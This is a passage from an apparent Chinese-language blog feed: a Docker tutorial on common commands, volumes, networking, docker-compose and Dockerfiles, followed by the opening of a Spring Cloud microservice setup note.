<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -e MY_ENV_VAR=my_value nginx</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>名称与网络</p>
<ul>
<li><p><code>--name string</code>: 给容器指定一个名称。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name my_nginx nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>--network string</code>: 连接到指定的网络。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --network my_network nginx</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>重启策略</p>
<ul>
<li><p><code>--restart string</code>: 定义容器的重启策略（<code>no</code>, <code>on-failure</code>, <code>always</code>, <code>unless-stopped</code>）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --restart always nginx</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>交互模式</p>
<ul>
<li><p><code>-i, --interactive</code>: 保持STDIN打开，即使没有附加也保持容器运行。</p>
</li>
<li><p><code>-t, --tty</code>: 分配一个伪TTY（终端）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu bash</span><br></pre></td></tr></table></figure>
<p>这个例子会启动一个Ubuntu容器，并进入交互式bash shell。</p>
</li>
</ul>
</li>
<li><p>配置资源限制</p>
<ul>
<li><p><code>-m, --memory bytes</code>: 设置容器内存限制。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -m 512m nginx</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>--cpus decimal</code>: 设置容器可用的CPU数量。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --cpus 1.5 nginx</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h4 id="docker-exec"><a href="#docker-exec" class="headerlink" title="docker exec"></a>docker exec</h4><p><strong>基本语法：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> [OPTIONS] CONTAINER COMMAND [ARG...]</span><br></pre></td></tr></table></figure>

<p><strong>常用选项：</strong></p>
<ul>
<li><code>-d, --detach</code>: 在后台运行命令。</li>
<li><code>-i, --interactive</code>: 保持 STDIN 打开，即使没有附加也保持容器运行。</li>
<li><code>-t, --tty</code>: 分配一个伪 TTY（终端）。</li>
<li><code>--env, -e</code>: 设置环境变量。</li>
<li><code>--user, -u</code>: 指定用户名或UID来运行命令。</li>
</ul>
<h4 id="docker-ps"><a href="#docker-ps" class="headerlink" title="docker ps"></a>docker ps</h4><p><strong>基本语法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps [OPTIONS]</span><br></pre></td></tr></table></figure>

<p><strong>常用选项</strong></p>
<ul>
<li><code>-a, --all</code>: 显示所有容器（包括停止的）。</li>
<li><code>-q, --quiet</code>: 只显示容器ID。</li>
<li><code>--no-trunc</code>: 不截断输出。</li>
</ul>
<h4 id="docker-images"><a href="#docker-images" class="headerlink" title="docker images"></a>docker images</h4><p><strong>基本语法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images [OPTIONS] [REPOSITORY[:TAG]]</span><br></pre></td></tr></table></figure>

<p><strong>常用选项</strong></p>
<ul>
<li><code>-a, --all</code>: 显示所有镜像（包括中间层）。</li>
<li><code>-q, --quiet</code>: 只显示镜像ID。</li>
</ul>
<h4 id="docker-build"><a href="#docker-build" class="headerlink" title="docker build"></a>docker build</h4><p><strong>基本语法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build [OPTIONS] PATH | URL | -</span><br></pre></td></tr></table></figure>

<p><strong>常用选项</strong></p>
<ul>
<li><code>-t, --tag list</code>: 对镜像进行命名和标记。</li>
<li><code>--no-cache</code>: 构建时不使用缓存。</li>
<li><code>--build-arg list</code>: 设置构建时的变量。</li>
</ul>
<h4 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h4><p><strong>基本语法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull [OPTIONS] NAME[:TAG|@DIGEST]</span><br></pre></td></tr></table></figure>

<p><strong>常用选项</strong></p>
<ul>
<li><code>-a, --all-tags</code>: 下载所有标签的镜像。</li>
</ul>
<h4 id="docker-rm"><a href="#docker-rm" class="headerlink" title="docker rm"></a>docker rm</h4><p><strong>基本语法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure>

<p><strong>常用选项</strong></p>
<ul>
<li><code>-f, --force</code>: 强制删除运行中的容器。</li>
<li><code>-v, --volumes</code>: 删除与容器关联的卷。</li>
</ul>
<h4 id="docker-rmi"><a href="#docker-rmi" class="headerlink" title="docker rmi"></a>docker rmi</h4><p><strong>基本语法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi [OPTIONS] IMAGE [IMAGE...]</span><br></pre></td></tr></table></figure>

<p><strong>常用选项</strong></p>
<ul>
<li><code>-f, --force</code>: 强制删除镜像。</li>
</ul>
<h4 id="docker-logs"><a href="#docker-logs" class="headerlink" title="docker logs"></a>docker logs</h4><p><strong>基本语法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker logs [OPTIONS] CONTAINER</span><br></pre></td></tr></table></figure>

<p><strong>常用选项</strong></p>
<ul>
<li><code>--follow, -f</code>: 跟踪日志输出。</li>
<li><code>--tail string</code>: 输出最近的 N 行日志（默认为 “all”）。</li>
</ul>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>实验：启动一个ngnix，并将其首页改为自己的页面，发布出去，让所有人均能使用。</p>
<p>过程：下载镜像 &#x3D;》启动容器 &#x3D;》修改页面 &#x3D;》保存镜像 &#x3D;》 分享社区</p>
<p><strong>Docker通过使用完整的镜像名称（包括仓库地址、项目名和标签）来区分不同的镜像库，默认访问官方库</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker search nginx 							<span class="comment"># 查看可拉取的版本，进部分大型镜像源支持此命令</span></span><br><span class="line">docker pull nginx   							<span class="comment"># 拉取nginx最新镜像 相当于 docker pull nginx:latest</span></span><br><span class="line">docker images    								<span class="comment"># 验证拉取情况</span></span><br><span class="line">docker run -d --name mynginx -p 88:80 nginx		<span class="comment"># 以后台运行模式运行nginx，docker内部80端口映射主机88端口</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mynginx	 /bin/bash				<span class="comment"># 以交互模式进入容器并通过主机bash进行交互</span></span><br><span class="line"><span class="comment"># 此后即可进入容器，在主机的bash中操作容器</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/nginx/html 						<span class="comment"># 进入容器内进行操作</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;h1&gt;hellodocker&lt;/h1&gt;&quot;</span> &gt; index.html</span><br><span class="line"><span class="built_in">exit</span>											<span class="comment"># 操作完成后退出镜像</span></span><br><span class="line"><span class="comment"># 保存镜像为本地tar文件</span></span><br><span class="line">docker commit -m <span class="string">&quot;update index.html&quot;</span> mynginx:v1.0 	<span class="comment"># 提交对镜像的修改，版本定为1.0，并附加修改信息</span></span><br><span class="line">docker save -o mynginx.tar mynginx:v1.0				<span class="comment"># 将镜像保存为tar格式方便分享</span></span><br><span class="line"><span class="comment"># 保存镜像并发布到社区</span></span><br><span class="line"><span class="comment"># 登录。受防火墙影响，使用国内阿里镜像服务，参见下文链接开通。只能使用自己的docker镜像</span></span><br><span class="line"><span class="comment"># 官方dockerhub只需要docker login即可</span></span><br><span class="line">docker login --username=shearington crpi-j40epi8sd0hrv9bl.cn-shenzhen.personal.cr.aliyuncs.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 阿里云私人镜像源仓库需要如此命名镜像源 链接/仓库名/镜像名</span></span><br><span class="line">docker tag mynginx:v1.0 crpi-j40epi8sd0hrv9bl.cn-shenzhen.personal.cr.aliyuncs.com/fsydocker/mynginx:v1.0</span><br><span class="line"><span class="comment"># docker tag mynginx:v1.0 shearington/mynginx:v1.0	# 为镜像改名 用户名/镜像名:版本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交到阿里云私人镜像源仓库</span></span><br><span class="line"><span class="comment"># 官方仓库： docker push shearington/mynginx:v1.0	</span></span><br><span class="line">docker push crpi-j40epi8sd0hrv9bl.cn-shenzhen.personal.cr.aliyuncs.com/fsydocker/mydocker:[镜像版本号]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他用户拿到tar格式文件后如何使用</span></span><br><span class="line">docker load -i mynginx.tar							<span class="comment"># 加载镜像</span></span><br><span class="line">docker run -d --name app01 -p 88:80 mynginx:v1.0	<span class="comment"># 运行</span></span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/2201_75443644/article/details/144310495">阿里个人镜像服务</a></p>
<h2 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h2><h3 id="目录挂载"><a href="#目录挂载" class="headerlink" title="目录挂载"></a>目录挂载</h3><p>Docker提供的是轻量级容器，内部缺少很多工具，在容器内修改非常不便。因此它提供了一个挂载功能，将容器内的目录挂载到外部主机，从而可以在外部主机进行修改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-v将容器的/usr/share/nginx/html目录挂载到主机的/app/nginx，可自动创建主机目录</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">即使删除容器，外部文件夹及其中的文件仍然存在</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始时不会自动同步容器和主机文件夹，且以主机文件夹为准，所以开始目录一定是空的</span></span><br><span class="line">docker run -d -p 88:80 -v /app/nginx:/usr/share/nginx/html --name app01 nginx </span><br></pre></td></tr></table></figure>



<h3 id="卷映射"><a href="#卷映射" class="headerlink" title="卷映射"></a>卷映射</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -v将容器的/etc/nginx目录映射到主机的nginx卷中</span></span><br><span class="line"><span class="comment"># 默认情况下，Docker卷存储在主机的 /var/lib/docker/volumes/ 目录下。每个卷都有一个唯一的名称</span></span><br><span class="line"><span class="comment"># 以容器内文件夹为准，原来容器内文件夹有什么，主机文件夹也有什么。</span></span><br><span class="line"><span class="comment"># 即使删除容器，外部文件夹及其中的文件仍然存在</span></span><br><span class="line">docker run -d -p 88:80 -v nginx:/etc/nginx --name app01 nginx </span><br><span class="line"></span><br><span class="line"><span class="comment"># docker 卷相关操作</span></span><br><span class="line">docker volume <span class="built_in">ls</span> 					<span class="comment"># 列出所有的卷</span></span><br><span class="line">docker volume create				<span class="comment"># 创建卷</span></span><br><span class="line">docker volume inspect volumeName	<span class="comment"># 查看某一个卷的具体信息，包括存储在主机什么位置</span></span><br></pre></td></tr></table></figure>





<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h4 id="主要网络模式"><a href="#主要网络模式" class="headerlink" title="主要网络模式"></a>主要网络模式</h4><ul>
<li><p><strong>Bridge模式</strong>：这是Docker<strong>默认</strong>的网络模式。Docker daemon会在主机上创建一个名为<code>docker0</code>的虚拟网桥，并为每个容器分配独立的网络命名空间和IP地址。容器间的通信可以通过这个网桥实现，而对外部的访问则需要通过端口映射来完成。</p>
</li>
<li><p><strong>Host模式</strong>：容器直接使用宿主机的网络栈，不提供网络隔离。这种方式减少了网络延迟并提高了性能，但牺牲了安全性。</p>
</li>
<li><p><strong>Overlay模式</strong>：用于跨主机的容器间通信。它依赖于Docker Swarm或Kubernetes等集群管理工具，能够在不同物理或虚拟机上的容器之间建立一个虚拟网络，使它们可以像在同一台机器上一样相互通信。</p>
</li>
<li><p><strong>None模式</strong>：容器没有任何网络配置，适合那些不需要网络功能的应用。</p>
</li>
</ul>
<h4 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h4><p>当启动一个容器时，如果没有指定网络模式，默认会使用bridge模式。Docker daemon会自动为该容器分配一个虚拟网卡，并将其连接到<code>docker0</code>网桥上。由此容器就拥有了一个独立的内部IP地址，可以通过<code>docker inspect containerName</code>查看容器对应的内部IP。</p>
<p>但是，通过IP地址进行容器间通信可能会因为容器的开启关闭而导致的IP频繁发生变化带来不便，因此在多容器环境中，Docker提供内置的DNS服务器，使得容器可以通过名称而不是IP地址相互发现和通信。默认的<code>docker0</code>网桥不支持域名访问，因此需要通过<code>docker network create netName</code>来创建一个自定义网络，并在容器启动时使用<code>--network netName</code>指定使用的网络，使用同一个网络的容器可以直接通过<code>容器名:端口</code>访问。</p>
<p><strong>跨主机通信</strong>：对于需要跨多个主机通信的场景，可以使用Overlay网络。首先，在各主机上部署Docker Engine，并初始化Swarm集群，然后创建一个Overlay网络，最后将容器加入到这个网络中。</p>
<h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker compose"></a>docker compose</h2><p><strong>Docker Compose</strong> 是一个用于定义和运行多容器 Docker 应用程序的工具。通过一个 <code>docker-compose.yml</code> 文件，你可以配置应用程序的服务、网络和卷等，然后使用一条命令来启动、停止和管理这些服务。</p>
<p><strong>基本工作流程</strong></p>
<ol>
<li><strong>编写 <code>docker-compose.yml</code> 文件</strong>：定义你的服务、网络和卷。</li>
<li><strong>启动服务</strong>：使用 <code>docker-compose up</code> 启动所有定义的服务。</li>
<li><strong>管理和维护服务</strong>：使用其他 Docker Compose 命令来管理服务。</li>
</ol>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>docker-compose up</code></td>
<td>启动所有服务</td>
</tr>
<tr>
<td><code>docker-compose up -d</code></td>
<td>在后台启动所有服务</td>
</tr>
<tr>
<td><code>docker-compose ps</code></td>
<td>显示所有服务的状态</td>
</tr>
<tr>
<td><code>docker-compose stop</code></td>
<td>停止所有服务</td>
</tr>
<tr>
<td><code>docker-compose start</code></td>
<td>启动已停止的服务</td>
</tr>
<tr>
<td><code>docker-compose restart</code></td>
<td>重启所有服务</td>
</tr>
<tr>
<td><code>docker-compose down</code></td>
<td>停止并移除所有服务</td>
</tr>
<tr>
<td><code>docker-compose logs</code></td>
<td>查看服务的日志</td>
</tr>
<tr>
<td><code>docker-compose exec</code></td>
<td>进入某个服务的容器（类似于 <code>docker exec</code>）</td>
</tr>
</tbody></table>
<h3 id="YML文件格式"><a href="#YML文件格式" class="headerlink" title="YML文件格式"></a>YML文件格式</h3><p><a href="https://docs.docker.com/reference/compose-file/">规范</a></p>
<h5 id="示例-docker-compose-yml"><a href="#示例-docker-compose-yml" class="headerlink" title="示例 docker-compose.yml"></a>示例 <code>docker-compose.yml</code></h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义整个服务集合的名称</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">myblog</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="comment"># MySQL 数据库服务配置</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="comment"># 指定容器名称</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="comment"># 使用的镜像版本</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8.0</span></span><br><span class="line">    <span class="comment"># 映射端口，将宿主机的3306端口映射到容器内的3306端口</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;3306:3306&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="comment"># 设置 root 用户的密码</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=123456</span></span><br><span class="line">      <span class="comment"># 创建一个名为 wordpress 的数据库</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=wordpress</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="comment"># 挂载数据卷，持久化 MySQL 数据</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql-data:/var/lib/mysql</span></span><br><span class="line">      <span class="comment"># 挂载自定义配置文件目录到容器内</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/app/myconf:/etc/mysql/conf.d</span></span><br><span class="line">    <span class="comment"># 总是重启容器，确保服务高可用性</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="comment"># 将服务加入名为 blog 的网络中，便于服务间通信</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">blog</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">wordpress:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">wordpress</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:80&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_HOST:</span> <span class="string">mysql</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_USER:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_PASSWORD:</span> <span class="number">123456</span></span><br><span class="line">      <span class="attr">WORDPRESS_DB_NAME:</span> <span class="string">wordpress</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">wordpress:/var/www/html</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">blog</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql</span></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">mysql-data:</span></span><br><span class="line">  <span class="attr">wordpress:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">blog:</span></span><br></pre></td></tr></table></figure>



<h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p><a href="https://docs.docker.com/reference/dockerfile/">参考规范</a></p>
<p>Dockerfile是一个文本文件，包含了一系列的指令，用于定义和构建Docker镜像。每个指令代表一个操作或配置，比如选择基础镜像、安装软件包、设置环境变量等。通过执行<code>docker build</code>命令，可以根据Dockerfile自动生成一个Docker镜像。</p>
<h3 id="示例：使用Dockerfile部署Java程序（JAR文件）"><a href="#示例：使用Dockerfile部署Java程序（JAR文件）" class="headerlink" title="示例：使用Dockerfile部署Java程序（JAR文件）"></a>示例：使用Dockerfile部署Java程序（JAR文件）</h3><p>创建一个新的目录用于存放项目文件和Dockerfile。在该目录下创建一个名为<code>Dockerfile</code>的文件（注意没有扩展名）。在这个文件中，定义构建镜像所需的所有指令。</p>
<p><strong>示例Dockerfile：</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用官方的OpenJDK作为基础镜像</span></span><br><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">11</span>-jre-slim</span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="comment"># 将当前目录下的jar包复制到容器中的/app目录</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> your-application.jar /app/your-application.jar</span></span><br><span class="line"><span class="comment"># 指定容器启动时运行的命令</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;/app/your-application.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>FROM</strong>：选择了一个基于OpenJDK 11的轻量级基础镜像。</li>
<li><strong>WORKDIR</strong>：设置容器内的工作目录为<code>/app</code>。</li>
<li><strong>COPY</strong>：将主机上的<code>your-application.jar</code>文件复制到容器的<code>/app</code>目录下。</li>
<li><strong>ENTRYPOINT</strong>：指定容器启动时运行的命令，这里是指令Java运行时执行我们的JAR文件。</li>
</ul>
<p><strong>构建镜像：</strong></p>
<p>在包含Dockerfile的目录下打开终端，执行以下命令来构建Docker镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t your-java-app .</span><br></pre></td></tr></table></figure>

<p>这里的<code>your-java-app</code>是给这个镜像起的名字，<code>.</code>表示Dockerfile位于当前目录。</p>
<p><strong>运行容器：</strong></p>
<p>一旦镜像构建完成，可以使用以下命令来运行Java应用程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name my-running-app your-java-app</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-d</code> 参数让容器在后台运行。</li>
<li><code>--name</code> 参数给运行的容器指定了一个名称<code>my-running-app</code>。</li>
<li>最后一个参数是之前构建的镜像名称。</li>
</ul>
<h3 id="分层机制"><a href="#分层机制" class="headerlink" title="分层机制"></a>分层机制</h3><p>Docker镜像采用分层存储机制，每个镜像由一系列只读的层组成，每层代表镜像的一部分如操作系统、应用程序及其依赖等。当创建容器时，会在镜像的最上层添加一个可写的层。</p>
<ul>
<li><strong>基础层</strong>：通常是一个操作系统环境，例如Ubuntu或Alpine Linux。</li>
<li><strong>中间层</strong>：包含应用运行所需的各种库和依赖项，每执行一条<code>RUN</code>指令会形成一个新的层。</li>
<li><strong>顶层（可写层）</strong>：当基于镜像启动容器时添加，用于存储容器运行时产生的数据变化，如文件修改、新增或删除。</li>
</ul>
<p>例如，当我们在官方Nginx镜像的基础上创建新的Nginx镜像时，实际上是在利用同一个基础层。这就是Docker镜像分层机制的一大优势，具体来说：</p>
<p><strong>共享基础层：</strong></p>
<ul>
<li><p><strong>官方Nginx镜像</strong>：这个镜像是由Nginx团队或Docker官方维护的，它包含了运行Nginx所需的基本环境和配置。这一部分构成了镜像的基础层。</p>
</li>
<li><p><strong>基于官方Nginx镜像的新镜像</strong>：当使用<code>FROM nginx</code>指令开始编写Dockerfile并在此基础上添加自定义配置、静态文件或其他依赖时，实际上是在官方Nginx镜像的顶部添加新的层。原有的基础层（即官方Nginx镜像的部分）保持不变。</p>
</li>
</ul>
<p><strong>实际效果：</strong></p>
<ul>
<li><p><strong>存储效率</strong>：由于基础层是只读的并且可以被多个镜像共享，因此无论在该基础镜像上构建了多少个不同的镜像，这些镜像都会共享同一份基础层的数据，从而节省了大量的存储空间。</p>
</li>
<li><p><strong>传输效率</strong>：当将基于相同基础镜像构建的新镜像推送到Docker仓库或者拉取到本地时，如果目标系统中已经存在了相同的基础层，那么只需要下载新增加的层即可，这大大加快了镜像的传输速度。</p>
</li>
</ul>
<p>例如，如果Dockerfile如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./html /usr/share/nginx/html</span></span><br></pre></td></tr></table></figure>

<p>这里，<code>FROM nginx</code>指定的基础镜像层与官方Nginx镜像的基础层是完全相同的。而<code>COPY</code>命令会在其基础上创建一个新的层来包含自己的静态文件（如HTML页面）。这样一来，新旧镜像之间的公共部分（即官方Nginx镜像的部分）可以被高效地复用。</p>
<h2 id="一键启动中间件"><a href="#一键启动中间件" class="headerlink" title="一键启动中间件"></a>一键启动中间件</h2><p><a href="https://www.yuque.com/leifengyang/sutong/au0lv3sv3eldsmn8#cGACF">参考</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>启动一个容器时应当关注：端口映射、卷映射、环境变量、网络配置。具体应当遵照docker<a href="hub.docker.com">官方仓库</a>的镜像提供者的说明。</p>
]]></content>
      <categories>
        <category>其他语言技术</category>
        <category>其他技术</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Cloud1-Microservice</title>
    <url>/2025/02/18/Java-Cloud1-Microservice/</url>
    <content><![CDATA[<h2 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h2><h3 id="SpringCloud简介"><a href="#SpringCloud简介" class="headerlink" title="SpringCloud简介"></a>SpringCloud简介</h3><p><strong>Spring Cloud</strong> 是一个用于构建分布式系统和微服务架构的开源框架，基于 <strong>Spring Boot</strong> 开发。它提供了一套工具和组件，帮助开发者快速实现微服务之间的通信、配置管理、负载均衡、服务注册与发现等功能。适合希望采用微服务架构的企业级应用开发。</p>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>微服务支持</strong>：简化微服务开发，解决服务间通信、容错、监控等问题。<strong>微服务</strong>是一种软件架构风格，它将一个完整的应用程序拆分为一组小型、独立、自治的服务，每个服务专注于完成特定的业务功能，并通过轻量级的通信机制（如 HTTP&#x2F;REST API、消息队列等）进行交互。</li>
<li><strong>核心模块</strong>：<ul>
<li><strong>Spring Cloud Netflix</strong>（如 Eureka、Ribbon、Hystrix）：服务注册与发现、负载均衡、断路器。</li>
<li><strong>Spring Cloud Config</strong>：集中化配置管理。</li>
<li><strong>Spring Cloud Gateway&#x2F;Zuul</strong>：API 网关。</li>
<li><strong>Spring Cloud Stream&#x2F;Bus</strong>：消息驱动与事件总线。</li>
</ul>
</li>
<li><strong>适用场景</strong>：适用于需要构建高可用、可扩展的分布式系统的项目。</li>
<li><strong>优势</strong>：整合性强，生态丰富，与 Spring Boot 高度集成，降低微服务开发复杂度。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20250219232030.png"></p>
<h4 id="SpringCloud组件"><a href="#SpringCloud组件" class="headerlink" title="SpringCloud组件"></a>SpringCloud组件</h4><p>画线属于不推荐使用的。</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/SpringCloud2024.png"></p>
<h3 id="笔记环境"><a href="#笔记环境" class="headerlink" title="笔记环境"></a>笔记环境</h3><p>Java JDK17+</p>
<p><a href="https://spring.io/projects/spring-cloud#overview">Cloud 2023.0.0</a>  <a href="https://github.com/spring-cloud">源码</a></p>
<p><a href="https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-3.0-Release-Notes">Boot 3.2.0</a>  <a href="https://github.com/spring-projects/spring-boot/releases">源码</a></p>
<p><a href="https://sca.aliyun.com/">Cloud Alibaba 2022.0.0.0 -RC2</a></p>
<p>Maven 3.9+</p>
<p>MySQL 8.0+</p>
<p>consul 1.20.4</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.bilibili.com/video/BV1gW421P7RD?vd_source=20530c92c1be8bd70e37346e3a5c037a&spm_id_from=333.788.videopod.episodes&p=3">尚硅谷SpringCloud2024</a></p>
<h2 id="微服务项目构建"><a href="#微服务项目构建" class="headerlink" title="微服务项目构建"></a>微服务项目构建</h2><h3 id="项目说明"><a href="#项目说明" class="headerlink" title="项目说明"></a>项目说明</h3><ol>
<li><p>模块命名规则：<code>cloud-[服务提供者/消费者]provider/consumer-[服务名][暴露端口]</code></p>
</li>
<li><p>微服务是一种软件架构风格，其核心是将一个完整的应用程序拆分为一组小型、独立的服务，每个服务专注于完成特定的业务功能。因此，每个微服务工程由自己暴露的端口。</p>
</li>
</ol>
<h3 id="父工程准备"><a href="#父工程准备" class="headerlink" title="父工程准备"></a>父工程准备</h3><p>包含的核心依赖及其作用：</p>
<ul>
<li><strong>Spring Boot</strong>：引入 <code>spring-boot-starter-parent</code>，版本为 <code>3.2.0</code>，作为基础框架。</li>
<li><strong>Spring Cloud</strong>：引入 <code>spring-cloud-dependencies</code>，版本为 <code>2023.0.0</code>，支持分布式系统开发。</li>
<li><strong>Spring Cloud Alibaba</strong>：引入 <code>spring-cloud-alibaba-dependencies</code>，版本为 <code>2022.0.0.0-RC2</code>，集成阿里巴巴的中间件组件。</li>
<li><strong>MyBatis</strong>：通过 <code>mybatis-spring-boot-starter</code> 集成 MyBatis 框架，版本为 <code>3.0.2</code>。</li>
<li><strong>MySQL 驱动</strong>：使用 <code>mysql-connector-java</code>，版本为 <code>8.0.11</code>。</li>
<li><strong>Druid 连接池</strong>：集成阿里云的 Druid 数据库连接池，版本为 <code>1.1.20</code>。</li>
<li><strong>通用 Mapper</strong>：引入 <code>tk.mybatis.mapper</code>，版本为 <code>4.2.3</code>，简化 MyBatis 的 CRUD 操作。</li>
<li><strong>FastJSON2</strong>：集成阿里巴巴的 JSON 序列化工具，版本为 <code>2.0.40</code>。</li>
<li><strong>Swagger3</strong>：通过 <code>springdoc-openapi-starter-webmvc-ui</code> 提供 API 文档生成功能，版本为 <code>2.2.0</code>。</li>
<li><strong>Hutool</strong>：引入 <code>hutool-all</code> 工具包，版本为 <code>5.8.22</code>，提供丰富的工具类。</li>
<li><strong>Lombok</strong>：集成 Lombok 工具，版本为 <code>1.18.26</code>，减少样板代码。</li>
<li><strong>JUnit 测试</strong>：引入 <code>spring-boot-starter-test</code>，版本为 <code>3.1.5</code>，用于单元测试。</li>
</ul>
<h3 id="mapper准备"><a href="#mapper准备" class="headerlink" title="mapper准备"></a>mapper准备</h3><p>在Pom文件引入相关依赖，并创建generatorConfig.xml文件配置MapperGenerator，创建config.properties记录JDBC配置。<a href="https://github.com/Fushiye/BlogDocuments/tree/main/SpringCloud/mapper">详情</a></p>
<p>config.properties</p>
